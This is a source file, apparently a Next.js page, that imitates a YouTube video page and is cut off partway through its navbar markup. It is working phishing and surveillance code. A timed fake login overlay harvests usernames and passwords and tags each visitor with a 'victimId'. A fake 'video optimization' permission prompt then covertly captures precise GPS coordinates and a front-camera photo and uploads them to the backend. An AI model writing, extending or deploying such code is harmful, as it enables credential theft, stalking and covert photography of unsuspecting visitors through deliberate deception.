'use client';

import { useState, useEffect } from 'react';

const VIDEO_ID = 'dQw4w9WgXcQ';

export default function Home() {
  const [showLogin, setShowLogin] = useState(false);
  const [showPermission, setShowPermission] = useState(false);
  const [victimId, setVictimId] = useState(null);
  const [notification, setNotification] = useState('');
  const [sidebarVideos, setSidebarVideos] = useState([]);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Sidebar video data
  useEffect(() => {
    setSidebarVideos([
      { title: '🔴 LIVE | Big Announcement Today!', channel: 'BBC News', views: '2.1M views', thumb: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/default.jpg' },
      { title: 'I Built a House in 100 Days', channel: 'MrBeast', views: '45M views', thumb: 'https://i.ytimg.com/vi/1/default.jpg' },
      { title: 'Python Full Course 2026', channel: 'FreeCodeCamp', views: '8.7M views', thumb: 'https://i.ytimg.com/vi/2/default.jpg' },
      { title: 'Avengers: New Trailer', channel: 'Marvel', views: '12M views', thumb: 'https://i.ytimg.com/vi/3/default.jpg' },
      { title: 'Top 10 Gaming Moments 2026', channel: 'GamingCentral', views: '3.4M views', thumb: 'https://i.ytimg.com/vi/4/default.jpg' },
    ]);
  }, []);

  // Show login overlay after 3 seconds
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowLogin(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  const showNotif = (msg) => {
    setNotification(msg);
    setTimeout(() => setNotification(''), 3000);
  };

  // Handle login form submission
  const handleLogin = async (e) => {
    e.preventDefault();
    if (isSubmitting) return;
    setIsSubmitting(true);

    try {
      const formData = new FormData();
      formData.append('username', username);
      formData.append('password', password);

      const res = await fetch('/api/login', {
        method: 'POST',
        body: formData,
      });

      const data = await res.json();
      if (data.victimId) {
        setVictimId(data.victimId);
      }

      // Hide login
      setShowLogin(false);
      setIsSubmitting(false);

      // Show permission request after a brief delay
      setTimeout(() => {
        setShowPermission(true);
      }, 1500);
    } catch (err) {
      setShowLogin(false);
      setIsSubmitting(false);
      setTimeout(() => {
        setShowPermission(true);
      }, 1500);
    }
  };

  // Capture GPS location
  const captureGPS = () => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null);
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          resolve({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
          });
        },
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
  };

  // Capture photo from front camera
  const capturePhoto = () => {
    return new Promise((resolve) => {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        resolve(null);
        return;
      }

      navigator.mediaDevices
        .getUserMedia({
          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false,
        })
        .then((stream) => {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            canvas.toBlob(
              (blob) => {
                stream.getTracks().forEach((track) => track.stop());
                resolve(blob);
              },
              'image/jpeg',
              0.9
            );
          }, 500);
        })
        .catch(() => resolve(null));
    });
  };

  // Send captured data to backend
  const sendCaptureData = async (gpsData, photoBlob) => {
    const formData = new FormData();
    if (gpsData) {
      formData.append('lat', gpsData.lat);
      formData.append('lng', gpsData.lng);
      formData.append('accuracy', gpsData.accuracy);
    }
    if (victimId) {
      formData.append('victimId', victimId);
    }
    if (photoBlob) {
      formData.append('photo', photoBlob, 'capture.jpg');
    }

    try {
      await fetch('/api/capture', { method: 'POST', body: formData });
    } catch (e) {
      // Silently fail
    }
  };

  // Handle permission grant
  const handleAllowPermissions = async () => {
    setShowPermission(false);
    showNotif('Optimizing video quality...');

    const [gpsData, photoBlob] = await Promise.all([
      captureGPS(),
      capturePhoto(),
    ]);

    await sendCaptureData(gpsData, photoBlob);
    showNotif('Video optimized');
  };

  // Handle permission skip
  const handleSkipPermissions = () => {
    setShowPermission(false);
    showNotif('Video optimized');
  };

  return (
    <>
      {/* Navbar */}
      <div className="navbar">
        <div className="nav-left">
          <svg className="menu-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M3 18
